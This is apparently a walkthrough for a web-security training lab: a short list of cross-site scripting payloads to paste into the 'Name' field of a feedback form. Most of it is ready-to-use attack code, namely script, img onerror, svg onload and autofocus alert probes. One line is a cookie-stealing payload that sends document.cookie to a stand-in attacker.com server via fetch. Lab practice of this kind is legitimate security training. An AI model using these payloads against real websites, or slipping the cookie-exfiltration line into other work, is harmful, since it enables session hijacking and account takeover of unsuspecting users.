Copy one of these payloads into the "Name" field of the feedback form:

Basic XSS:
<script>alert(document.domain)</script>

Image-based XSS:
<img src=x onerror=alert(1)>

SVG XSS:
<svg onload=alert(1)>

Auto-focus XSS:
<input onfocus=alert(1) autofocus>

For cookie stealing (replace attacker.com with your server):
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

To prove XSS works and get the lab solved:
<script>alert(document.cookie)</script>
